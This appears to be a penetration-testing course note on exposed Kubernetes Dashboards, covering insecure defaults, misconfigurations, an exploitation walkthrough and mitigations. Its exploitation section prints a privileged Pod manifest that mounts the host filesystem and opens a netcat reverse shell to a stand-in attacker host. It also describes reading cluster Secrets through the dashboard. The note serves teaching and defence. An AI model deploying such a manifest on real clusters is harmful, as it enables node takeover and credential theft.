---
tags: [kubernetes, k8s, dashboard, misconfiguration, exploitation]
difficulty: intermediate
module: "38 - Container and Kubernetes Security"
topic: "38.12 Exposed Dashboard"
---

# Exposed Kubernetes Dashboard

## Introduction
The Kubernetes Dashboard is a general-purpose, web-based UI for Kubernetes clusters. It allows users to manage cluster resources, deploy containerized applications, troubleshoot issues, and view real-time metrics. 

While incredibly useful for administration, the Dashboard is also a massive, centralized point of failure if misconfigured. Because it interacts directly with the `kube-apiserver` to manage resources, the Dashboard effectively acts as an operational proxy. If an attacker gains unauthorized access to the Dashboard, they inherit the privileges of the ServiceAccount the Dashboard is using to authenticate to the API.

## The Architecture of the Vulnerability

The vulnerability stems from a combination of network exposure and overly permissive authentication configurations.

```text
+-------------------------------------------------------------------------+
|                          Attacker (Internet)                            |
+-----------------------------+-------------------------------------------+
                              | (Unauthenticated HTTP/HTTPS)
                              v
+-----------------------------+-------------------------------------------+
|                      Cloud Load Balancer / NodePort                     |
|                   (Misconfigured to expose Dashboard)                   |
+-----------------------------+-------------------------------------------+
                              |
+-----------------------------|-------------------------------------------+
|        KUBERNETES CLUSTER   |                                           |
|                             v                                           |
|    +------------------------+-----------------------+                   |
|    |               kubernetes-dashboard Pod         |                   |
|    |                                                |                   |
|    |  [ Web UI ] ---> [ ServiceAccount Token ]      |                   |
|    |                        |                       |                   |
|    +------------------------|-----------------------+                   |
|                             | (API Requests)                            |
|                             v                                           |
|    +------------------------+-----------------------+                   |
|    |                   kube-apiserver               |                   |
|    |      (Processes request based on SA RBAC)      |                   |
|    +------------------------------------------------+                   |
+-------------------------------------------------------------------------+
```

### The Historical Context (Pre-1.10.1)
In older versions of the Kubernetes Dashboard, the default installation was inherently insecure. 
1.  It did not require any authentication/login prompt by default.
2.  It was deployed with a dedicated ServiceAccount that was automatically bound to the `cluster-admin` role (full root access).
If this dashboard was accidentally exposed to the internet via a NodePort or LoadBalancer, an attacker could literally open the URL in their browser and have full graphical root access to the entire cluster. This exact vector was used in the infamous Tesla cryptojacking breach.

### Modern Configurations and Persistent Risks
Modern versions (post-1.10.1) require authentication by default (via Kubeconfig or a Bearer Token) and the default ServiceAccount has minimal privileges. 

However, misconfigurations are still rampant due to "convenience":
1.  **The "Skip Login" Misconfiguration**: Administrators frustrated by token generation often enable the `--enable-skip-login` flag. This allows anyone to click "Skip" and enter the dashboard.
2.  **The "Privileged ServiceAccount" Anti-Pattern**: If "Skip Login" is used, the dashboard relies on its own ServiceAccount. Administrators often manually grant this account `cluster-admin` privileges so the dashboard can actually manage resources, recreating the exact vulnerability of the pre-1.10.1 era.
3.  **Network Exposure**: The dashboard is meant to be accessed securely via `kubectl proxy` (port-forwarding over an authenticated API tunnel). Exposing it via an Ingress Controller, LoadBalancer, or NodePort to the open internet is a critical architectural flaw.

## Exploitation Mechanics

Exploiting an exposed dashboard is generally straightforward and often done entirely through the web browser.

### 1. Reconnaissance and Discovery
Attackers locate exposed dashboards via internet scanning engines like Shodan or Censys, searching for specific page titles (`Kubernetes Dashboard`) or unique hash signatures of the dashboard's static assets.
During a penetration test, internal scanning tools (like `nmap` or `gobuster`) will find the dashboard running on internal IPs.

### 2. Authentication Bypass / Token Theft
*   If the "Skip" button is present, the attacker clicks it.
*   If a token is required, the attacker may look for leaked tokens in public GitHub repositories, exposed `.kube/config` files, or use a token extracted from a lower-privileged pod compromise (hoping the user reused a high-privileged token).

### 3. Execution and Privilege Escalation
Once inside the GUI, the attacker maps the cluster. If the dashboard has high privileges (e.g., `cluster-admin` or high permissions in a specific namespace), the attacker's goal is to achieve persistent code execution on the underlying nodes.

**The "Malicious Pod" Vector:**
The attacker navigates to the "+" (Create) button in the top right corner of the dashboard. They can deploy a raw YAML manifest directly through the web UI.

They deploy a privileged DaemonSet or Pod designed for container escape:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: host-mount-escape
  namespace: kube-system
spec:
  containers:
  - name: payload
    image: ubuntu:latest
    command: ["/bin/bash", "-c", "apt update && apt install -y netcat && nc -e /bin/bash attacker.com 4444"]
    securityContext:
      privileged: true   # Request all capabilities and bypass seccomp
    volumeMounts:
    - name: host-root
      mountPath: /host   # Mount the node's root filesystem
  volumes:
  - name: host-root
    hostPath:
      path: /
```

Once the pod starts, it connects back to the attacker with a reverse shell. Because the pod is privileged and has the host filesystem mounted, the attacker `chroot /host` and instantly has root access to the underlying Kubernetes Worker Node. From there, they can dump `kubelet` credentials or pivot to the Control Plane.

### 4. Secret Extraction
Alternatively, if the attacker just wants credentials, they can navigate to the "Config and Storage" -> "Secrets" tab. If the dashboard's ServiceAccount has the `get secrets` RBAC permission, the attacker can view every database password, API key, and TLS certificate in plain text directly in the browser.

## Mitigation Strategies

1.  **Never Expose Externally**: The Dashboard should never be accessible over the internet or untrusted networks. Do not use Ingress, NodePort, or LoadBalancer services for it.
2.  **Use `kubectl proxy`**: The only way to access the dashboard should be via `kubectl proxy`, which creates a secure, authenticated tunnel from localhost directly to the API server.
3.  **Enforce Authentication**: Never use the `--enable-skip-login` flag. Force users to authenticate using OIDC (Single Sign-On) or specific Bearer Tokens.
4.  **Strict RBAC**: Ensure the ServiceAccount attached to the `kubernetes-dashboard` deployment has the absolute minimum privileges required. It should **never** be bound to `cluster-admin`.
5.  **Consider Alternatives**: For read-only visibility, consider tools like **Lens**, **k9s**, or **Octant**, which run locally on the administrator's machine and authenticate securely using their existing Kubeconfig, rather than hosting a centralized web app in the cluster.

## Chaining Opportunities
*   [[11 - Kubernetes RBAC — ClusterAdmin Misconfig]]: The impact of an exposed dashboard is entirely dependent on the RBAC permissions of its underlying ServiceAccount.
*   [[07 - Container Escape — Kernel Exploits]]: Once a malicious pod is deployed via the dashboard, an attacker might use kernel exploits if standard privileged container escapes (like hostPath mounts) are blocked by policies.
*   [[10 - Kubernetes Architecture — Control Plane, Nodes, Pods]]: Understanding the architecture clarifies why compromising the dashboard is effectively interacting with the Control Plane's API server.

## Related Notes
*   [[14 - Advanced Pod Security Standards (PSS)]]
*   [[18 - Kubernetes Penetration Testing Methodology]]
